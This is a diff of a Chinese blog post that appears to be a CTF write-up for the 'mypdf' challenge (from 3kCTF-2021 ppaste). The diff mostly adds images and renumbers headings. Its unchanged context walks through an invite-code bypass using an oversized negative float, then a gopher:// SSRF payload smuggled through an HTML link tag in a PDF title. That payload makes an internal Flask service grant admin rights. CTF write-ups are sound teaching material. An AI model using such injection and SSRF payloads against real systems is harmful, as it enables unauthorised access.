@@ -255,6 +255,7 @@
 <span id="more"></span>
 
 <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>今天刚打了一场广东省大学生网络安全竞赛，只能说这比赛十分垃j，这里不细说。但是其中有一题名为“mypdf”是从3KCTF中扒下来的题目，质量很好，值得审计记录，故有此文。</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130205898.png"></p>
 <p>原题：3kCTF-2021 ppaste</p>
 <h1 id="0x02-基本思路"><a href="#0x02-基本思路" class="headerlink" title="0x02 基本思路"></a>0x02 基本思路</h1><p>拿到这道题的时候，一开始直接放弃了，因为太困了加上队友很给力，完全躺平等着带飞就好了，但是后来发现赛方不上新题加上肯定有很多人py，之前做完的题都被做烂了，于是收到队友的消息发现是原题且带详细解析，直接跑下床做题</p>
 <p><img src="http://oss.hehanzzz.icu/img/202405130149912.png">​</p>
@@ -310,7 +311,7 @@
 <p>payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;register&quot;</span>,<span class="string">&quot;d&quot;</span>:&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;hehanzzz&quot;</span>,<span class="string">&quot;pass&quot;</span>:<span class="string">&quot;hehanzzz123&quot;</span>,<span class="string">&quot;invite&quot;</span>:-<span class="number">3.3e99999999999999</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="TCPDF-探究-及-Gopher协议SSRF打Flask服务"><a href="#TCPDF-探究-及-Gopher协议SSRF打Flask服务" class="headerlink" title="TCPDF 探究 及 Gopher协议SSRF打Flask服务"></a>TCPDF 探究 及 Gopher协议SSRF打Flask服务</h3><p>注册完后，回到主页面进行添加文章，我们可以看到文章详细页有个下载pdf，放入标题时，发现可以成功解析到html标签</p>
+<h1 id="0x04-TCPDF-探究-及-Gopher协议SSRF打Flask服务"><a href="#0x04-TCPDF-探究-及-Gopher协议SSRF打Flask服务" class="headerlink" title="0x04 TCPDF 探究 及 Gopher协议SSRF打Flask服务"></a>0x04 TCPDF 探究 及 Gopher协议SSRF打Flask服务</h1><p>注册完后，回到主页面进行添加文章，我们可以看到文章详细页有个下载pdf，放入标题时，发现可以成功解析到html标签</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\s+/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$data</span>[<span class="string">&#x27;d&#x27;</span>][<span class="string">&#x27;title&#x27;</span>]);</span><br></pre></td></tr></table></figure>
 
 <p>但是这不是漏洞点，别忘记了这个题目的标题叫什么，故需要从download路由下手分析</p>
@@ -364,18 +365,19 @@
 <p>即可得到flag</p>
 <p>但是&#x3D;.&#x3D;</p>
 <p>这台机器不出网，不能这么打</p>
-<h4 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h4><p>前面有提到过，这题与原题多了一个 <code>gopher</code>​ 协议的正则匹配</p>
+<h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>前面有提到过，这题与原题多了一个 <code>gopher</code>​ 协议的正则匹配</p>
 <p>所以，我们可以直接利用 <code>gopher</code>​ 协议去打，不需要vps去配合跳转（所以它算是魔改了TCPDF组件来满足我们获取flag的条件）</p>
 <p>故payload为：（需要注意的是，这里的user是另一个用户的，并未发送请求包的这个用户）</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;new&quot;</span>,<span class="string">&quot;d&quot;</span>:&#123;<span class="string">&quot;title&quot;</span>:<span class="string">&quot;&lt;linktype=\&quot;text/css\&quot;href=\&quot;gopher://localhost:8082/_POST%20/users%20HTTP/1.1%0D%0AHost%3A%20localhost%0D%0AContent-Length%3A%2018%0D%0AContent-type%3A%20application/json%0D%0A%0D%0A%7B%22user%22%3A%22hhhm123%22%7D%0D%0A\&quot;&gt;&quot;</span>,<span class="string">&quot;content&quot;</span>:<span class="string">&quot;123123123123123123123&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://oss.hehanzzz.icu/img/202405130149339.png">​</p>
 <p>再去下载PDF进行触发，然后请求api.php，得到flag</p>
+<p><img src="http://oss.hehanzzz.icu/img/202405130206528.png"></p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;action&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://oss.hehanzzz.icu/img/202405130148565.png">​</p>
 <p>这里的ok就是flag</p>
-<h1 id="0x04-参考文献"><a href="#0x04-参考文献" class="headerlink" title="0x04 参考文献"></a>0x04 参考文献</h1><ul>
+<h1 id="0x05-参考文献"><a href="#0x05-参考文献" class="headerlink" title="0x05 参考文献"></a>0x05 参考文献</h1><ul>
 <li><p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/2069757">3kCTF2021-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
 </li>
 <li><p><a target="_blank" rel="noopener" href="https://b6a.black/posts/2021-05-22-3kctf/#ppaste-web-498-points">3kCTF-2021 报道 |黑紫荆 (b6a.black)</a></p>
